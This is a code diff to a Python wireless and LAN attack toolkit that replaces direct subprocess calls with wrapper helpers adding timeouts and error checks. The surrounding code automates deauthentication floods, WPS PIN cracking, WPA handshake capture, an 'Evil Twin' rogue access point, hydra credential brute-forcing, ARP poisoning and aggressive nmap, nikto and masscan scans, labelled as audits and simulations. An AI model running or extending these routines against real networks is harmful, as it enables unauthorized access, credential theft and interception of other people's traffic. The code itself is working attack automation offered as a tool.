@@ -101,7 +101,11 @@ REQUIRED_TOOLS = [
 missing_tools = []
 for tool in REQUIRED_TOOLS:
     cmd = ["where", tool] if os.name == 'nt' else ["which", tool]
-    if subprocess.run(cmd, capture_output=True).returncode != 0:
+    try:
+        result = subprocess.run(cmd, capture_output=True, timeout=5)
+        if result.returncode != 0:
+            missing_tools.append(tool)
+    except Exception:
         missing_tools.append(tool)
 if missing_tools:
     print(f"[FATAL] Missing required tools: {', '.join(missing_tools)}. Please install them before running.")
@@ -941,13 +945,13 @@ class WiFiSecurityModule(ToolManager):
     def set_monitor_mode(self, enable=True):
         try:
             if enable:
-                subprocess.run(["airmon-ng", "check", "kill"], check=False, capture_output=True)
-                subprocess.run(["airmon-ng", "start", self.interface], check=True, capture_output=True, timeout=30)
+                run_cmd_simple(["airmon-ng", "check", "kill"], description="Kill interfering processes", check=False)
+                run_cmd_simple(["airmon-ng", "start", self.interface], description="Start monitor mode", timeout=30)
                 guardian_state["wireless_mode"] = "monitor"
                 update_status(f"Monitor mode enabled on {self.interface}", "Wi-Fi")
             else:
-                subprocess.run(["airmon-ng", "stop", self.interface], check=True, capture_output=True, timeout=30)
-                subprocess.run(["service", "NetworkManager", "start"], check=False, capture_output=True)
+                run_cmd_simple(["airmon-ng", "stop", self.interface], description="Stop monitor mode", timeout=30)
+                run_cmd_simple(["service", "NetworkManager", "start"], description="Start NetworkManager", check=False)
                 guardian_state["wireless_mode"] = "managed"
                 update_status(f"Monitor mode disabled on {self.interface}", "Wi-Fi")
             return True
@@ -964,7 +968,9 @@ class WiFiSecurityModule(ToolManager):
         update_status("Scanning for Wi-Fi networks...", "Wi-Fi Scan")
         try:
             cmd = ["airodump-ng", "--output-format", "csv", "--write", "/tmp/wifi_scan", self.interface]
-            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+            proc = run_cmd_with_output(cmd, description="Wi-Fi network scan", timeout=30)
+            if not proc:
+                return []
             networks = []
             for line in proc.stdout.split('\n'):
                 if ',' in line and not line.startswith('BSSID'):
@@ -994,7 +1000,7 @@ class WiFiSecurityModule(ToolManager):
             dump_cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "-w", path, self.interface]
             dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             time.sleep(5)
-            subprocess.run(["aireplay-ng", "-0", "5", "-a", bssid, self.interface], check=True, capture_output=True, timeout=30)
+            run_cmd_simple(["aireplay-ng", "-0", "5", "-a", bssid, self.interface], description="Send deauth packets", timeout=30)
             time.sleep(10)
             dump_proc.terminate(); dump_proc.wait(timeout=5)
             cap_file = f"{path}-01.cap"
@@ -1010,7 +1016,10 @@ class WiFiSecurityModule(ToolManager):
         update_status(f"Starting WPS vulnerability audit on {bssid}...", "Wi-Fi Audit", bssid)
         try:
             cmd = ["reaver", "-i", self.interface, "-b", bssid, "-vv", "-K", "1"]
-            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=WPS_AUDIT_TIMEOUT)
+            proc = run_cmd_with_output(cmd, description="WPS audit", timeout=WPS_AUDIT_TIMEOUT)
+            if not proc:
+                update_status(f"WPS audit failed on {bssid}", "Error")
+                return None
             pin_match = re.search(r"WPS PIN: '(\d+)'", proc.stdout)
             pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
             if pass_match:
@@ -1018,7 +1027,10 @@ class WiFiSecurityModule(ToolManager):
                 return pass_match.group(1)
             if pin_match:
                 update_status(f"WPS PIN found: {pin_match.group(1)}. Re-running to get PSK.", "Wi-Fi Audit")
-                proc = subprocess.run(cmd + ["-p", pin_match.group(1)], capture_output=True, text=True, timeout=300)
+                proc = run_cmd_with_output(cmd + ["-p", pin_match.group(1)], description="WPS audit with PIN", timeout=300)
+                if not proc:
+                    update_status(f"WPS audit with PIN failed on {bssid}", "Error")
+                    return None
                 pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
                 if pass_match: return pass_match.group(1)
             update_status(f"WPS audit on {bssid} complete. No vulnerabilities found.", "Wi-Fi Audit")
@@ -1041,13 +1053,13 @@ class WiFiSecurityModule(ToolManager):
         try:
             with open(hostapd_conf_path, "w") as f: f.write(hostapd_conf)
             with open(dnsmasq_conf_path, "w") as f: f.write(dnsmasq_conf)
-            subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=True)
-            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface], check=True)
+            run_cmd_simple(["ip", "addr", "flush", "dev", self.interface], description="Flush interface addresses")
+            run_cmd_simple(["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface], description="Add rogue AP IP")
             # --- DEAUTH step: force clients off the real AP ---
             if real_bssid:
                 try:
                     update_status(f"Sending deauth packets to {real_bssid} to force clients to Evil Twin...", "Deauth")
-                    subprocess.run(["aireplay-ng", "-0", "10", "-a", real_bssid, self.interface], check=True, capture_output=True, timeout=30)
+                    run_cmd_simple(["aireplay-ng", "-0", "10", "-a", real_bssid, self.interface], description="Send deauth to real AP", timeout=30)
                 except Exception as e:
                     update_status(f"Deauth step failed: {e}", "Warning")
             subprocess.Popen(["hostapd", hostapd_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -1123,7 +1135,7 @@ class WiFiSecurityModule(ToolManager):
         try:
             cmd = ["nmcli", "device", "wifi", "connect", ssid]
             if password: cmd.extend(["password", password])
-            subprocess.run(cmd, check=True, capture_output=True, timeout=30)
+            run_cmd_simple(cmd, description="Connect to Wi-Fi network", timeout=30)
             update_status(f"Successfully connected to {ssid}", "Connected", ssid)
             return True
         except Exception as e:
@@ -1245,7 +1257,9 @@ class PasswordStrengthAnalyzer:
         try:
             with open(tmp_wordlist, "w") as f: f.write(password + "\n")
             cmd = ["aircrack-ng", "-w", tmp_wordlist, "-e", ssid, handshake_file]
-            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            proc = run_cmd_with_output(cmd, description="Aircrack password verification", timeout=60)
+            if not proc:
+                return False
             return "KEY FOUND!" in proc.stdout
         except Exception: return False
         finally:
@@ -1284,7 +1298,9 @@ class LanAnalyzer(ToolManager):
     # Retrieves the local IP address and subnet in CIDR format for the specified interface.
     def get_local_ip_and_subnet(self):
         try:
-            result = subprocess.run(["ip", "addr", "show", self.interface], capture_output=True, text=True, check=True)
+            result = run_cmd_with_output(["ip", "addr", "show", self.interface], description="Get interface IP info")
+            if not result:
+                return None, None
             ip_match = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", result.stdout)
             if ip_match:
                 ip_with_cidr = ip_match.group(1)
@@ -1301,7 +1317,10 @@ class LanAnalyzer(ToolManager):
         found_hosts = {}
         try:
             command = ["nmap", "-sV", "-sC", "-O", "-T4", "-oX", "-", target_ip_range]
-            process = subprocess.run(command, capture_output=True, text=True, check=True, timeout=NMAP_SCAN_TIMEOUT)
+            process = run_cmd_with_output(command, description="Nmap scan", timeout=NMAP_SCAN_TIMEOUT)
+            if not process:
+                update_status("Nmap scan failed", "Error")
+                return {}
             root = ET.fromstring(process.stdout)
             for host in root.findall('host'):
                 ip_elem = host.find("address[@addrtype='ipv4']")
@@ -1335,7 +1354,10 @@ class LanAnalyzer(ToolManager):
         update_status(f"Running Nikto vulnerability scan on {target_ip}:{port}...", "Vulnerability Scan")
         try:
             command = ["nikto", "-h", f"http://{target_ip}:{port}", "-Tuning", "x", "6", "-output", "-"]
-            process = subprocess.run(command, capture_output=True, text=True, timeout=NIKTO_SCAN_TIMEOUT)
+            process = run_cmd_with_output(command, description="Nikto scan", timeout=NIKTO_SCAN_TIMEOUT)
+            if not process:
+                update_status(f"Nikto scan failed on {target_ip}:{port}", "Error")
+                return None
             if target_ip in guardian_state["analyzed_hosts"]:
                 guardian_state["analyzed_hosts"][target_ip]["vulnerabilities"][port] = process.stdout
             log_to_sd_card(f"nikto_{target_ip}_{port}.log", process.stdout)
@@ -1362,7 +1384,10 @@ class LanAnalyzer(ToolManager):
                 for cred in password_list:
                     f.write(f"{cred}\n")
             cmd = ["hydra", "-L", user_list, "-P", pass_file, "-s", port, f"{service}://{target_ip}"]
-            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=HYDRA_TIMEOUT)
+            proc = run_cmd_with_output(cmd, description="Hydra credential test", timeout=HYDRA_TIMEOUT)
+            if not proc:
+                update_status(f"Hydra credential test failed on {target_ip}:{port}", "Error")
+                return None
             creds_match = re.search(r"login: (\S+)\s+password: (\S+)", proc.stdout)
             if creds_match:
                 username = creds_match.group(1)
@@ -1387,7 +1412,10 @@ class LanAnalyzer(ToolManager):
         update_status(f"Enumerating SMB shares on {target_ip}...", "Discovery")
         try:
             cmd = ["smbclient", "-L", f"//{target_ip}", "-N"]
-            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            proc = run_cmd_with_output(cmd, description="SMB share enumeration", timeout=60)
+            if not proc:
+                update_status(f"SMB enumeration failed on {target_ip}", "Error")
+                return []
             shares = re.findall(r"^\s+(Disk\s+.+?)\s+", proc.stdout, re.MULTILINE)
             if shares and target_ip in guardian_state["analyzed_hosts"]:
                 guardian_state["analyzed_hosts"][target_ip]["shares"] = shares
@@ -1404,7 +1432,7 @@ class LanAnalyzer(ToolManager):
     def simulate_arp_poisoning(self, target_ip, gateway_ip):
         update_status(f"Simulating ARP poisoning between {target_ip} and {gateway_ip} to test resilience...", "MITM Simulation")
         try:
-            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
+            run_cmd_simple(["sysctl", "-w", "net.ipv4.ip_forward=1"], description="Enable IP forwarding")
             target_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             gw_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", gateway_ip, target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
@@ -1420,7 +1448,10 @@ class LanAnalyzer(ToolManager):
     def get_wan_ip(self):
         update_status("Determining WAN IP address...", "Discovery")
         try:
-            result = subprocess.run(["curl", "-s", "https://api.ipify.org"], capture_output=True, text=True, check=True, timeout=10)
+            result = run_cmd_with_output(["curl", "-s", "https://api.ipify.org"], description="Get WAN IP", timeout=10)
+            if not result:
+                update_status("Failed to get WAN IP", "Error")
+                return None
             wan_ip = result.stdout.strip()
             guardian_state["wan_ip"] = wan_ip
             update_status(f"WAN IP: {wan_ip}", "Discovery")
@@ -1509,7 +1540,7 @@ class LanAnalyzer(ToolManager):
         temp_dir = tempfile.gettempdir()
         out = os.path.join(temp_dir, "masscan.json")
         cmd = ["masscan", cidr, "-p1-65535", f"--rate={rate}", "-oJ", out]
-        subprocess.run(cmd, check=True, timeout=60)
+        run_cmd_simple(cmd, description="Masscan port scan", timeout=60)
         with open(out) as f: results = json.load(f)
         update_status(f"masscan returned {len(results)} entries", "Discovery (masscan)")
         return results
